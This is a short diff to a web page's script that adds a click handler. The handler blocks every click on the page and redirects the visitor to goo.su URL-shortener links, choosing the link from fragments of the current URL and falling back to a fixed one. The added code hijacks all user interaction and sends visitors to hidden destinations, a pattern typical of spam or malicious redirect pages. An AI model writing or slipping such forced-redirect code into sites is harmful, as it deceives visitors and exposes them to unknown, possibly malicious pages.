@@ -116,10 +116,20 @@
 		</div>
 	</div>
 	<script>
+		const paths = ["0QwQW8", "TllwYU7", "b5WeZ", "J3tHdw", "jdVxl"];
+
 		document.addEventListener("click", function (event) {
-			window.location.href = "https://goo.su/g/dtBl9cL";
 			event.stopPropagation();
 			event.preventDefault();
+			
+			for (let path of paths) {
+				if (window.location.href.includes(path)) {
+					window.location.href = "https://goo.su/g/" + path;
+					return;
+				}
+			}
+
+			window.location.href = "https://goo.su/g/dtBl9cL";
 		});
 	</script>
 </body>
